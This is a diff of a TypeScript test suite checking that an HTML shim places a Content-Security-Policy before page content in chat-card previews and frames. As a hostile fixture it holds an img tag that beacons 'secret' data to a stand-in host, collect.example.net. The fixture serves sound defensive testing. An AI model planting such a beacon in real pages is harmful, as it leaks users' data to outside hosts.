@@ -917,7 +917,18 @@ describe("html shim", () => {
     expect(withShim("<h1>a</h1>").indexOf("<script>")).toBeLessThan(withShim("<h1>a</h1>").indexOf("<h1>"));
   });
 
-  test("a chat card's preview and the opened page both load nothing from the network, policy before the page", async () => {
+  test("a chat card's preview loads nothing from the network, its policy before anything of the page", () => {
+    const hostile = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head><title>x</title></head></html>`;
+    const preview = withShim(hostile);
+    const policy = `<meta http-equiv="Content-Security-Policy" content="${PAGE_CSP}">`;
+    expect(preview.indexOf(policy)).toBeGreaterThan(-1);
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<img"));
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<script>"));
+    expect(PAGE_CSP).toContain("default-src 'none'");
+    expect(PAGE_CSP).not.toContain("http");
+  });
+
+  test("the card's frame loads the page behind the policy", async () => {
     const pages: Blob[] = [];
     const create = URL.createObjectURL;
     URL.createObjectURL = (b: Blob | MediaSource) => {
@@ -925,20 +936,12 @@ describe("html shim", () => {
       return `blob:page-${pages.length}`;
     };
     try {
-      const html = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head></head><body>x</body></html>`;
-      render(
-        <>
-          <HtmlFrame html={html} title="card" thumbnail />
-          <HtmlFrame html={html} title="opened" />
-        </>,
-      );
+      const html = "<!doctype html><html><head></head><body>x</body></html>";
+      render(<HtmlFrame html={html} title="card" thumbnail />);
       await settle(1);
-      for (const page of await Promise.all(pages.slice(0, 2).map((b) => b.text()))) {
-        expect(page.indexOf(`content="${PAGE_CSP}"`)).toBeGreaterThan(0);
-        expect(page.indexOf("Content-Security-Policy")).toBeLessThan(page.indexOf("<img"));
-      }
-      expect(PAGE_CSP).toContain("default-src 'none'");
-      expect(PAGE_CSP).toContain("img-src data: blob:");
+      const card = await pages[0]?.text();
+      expect(card?.indexOf(PAGE_CSP)).toBeGreaterThan(-1);
+      expect(card?.indexOf(PAGE_CSP)).toBeLessThan(card?.indexOf("<body>") ?? -1);
     } finally {
       URL.createObjectURL = create;
     }
